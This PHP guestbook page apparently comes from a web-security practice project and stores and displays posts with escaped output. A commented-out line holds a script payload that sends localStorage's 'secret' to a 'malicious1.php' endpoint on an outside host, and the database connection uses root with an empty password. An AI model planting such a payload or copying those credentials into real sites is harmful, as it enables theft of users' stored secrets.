<?php
require_once 'templates/header.php';
echo "<script src='js/main.js'></script>";
// echo "<script>location.href = `http://192.168.102.164:5000/malicious1.php?data={localStorage.getItem('secret')}`</script>";
echo "<script>console.log('data='+localStorage.getItem('secret'))</script>";
?>

<?php
$db = new PDO("mysql:host=localhost;dbname=Practice_security", 'root', '');
?>

<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['username']) && !empty($_POST['message'])) :
    $name = $_POST['username'];
    $message = $_POST['message'];
    $statement = $db->prepare("INSERT INTO posts (name, message) VALUES (:name, :message)");
    $statement->execute([
        ':name' => $name,
        ':message' => $message
    ]);
endif;
?>

<form id="form" action="" method="post">
    <div class="row mb-3 mt-3">
        <div class="col">
            <input type="text" class="form-control" placeholder="Enter Name" name="username">
        </div>
    </div>

    <div class="mb-3">
        <textarea name="message" placeholder="Enter message" class="form-control"></textarea>
    </div>
    <div class="d-grid">
        <button type="submit" class="btn btn-primary">Add new post</button>
    </div>
</form>
</script>

<?php
$statement = $db->query("SELECT name, message FROM posts");
$posts = $statement->fetchAll();

foreach ($posts as $post) :
?>
    <div class="card">
        <div class="card-header">
            <span><?php echo htmlspecialchars($post['name']) ?></span>
        </div>
        <div class="card-body">
            <p class="card-text"><?php echo htmlspecialchars($post['message']) ; ?></p>
        </div>
    </div>
    <hr>
<?php
endforeach;
?>

<?php
require_once 'templates/footer.php';
?>


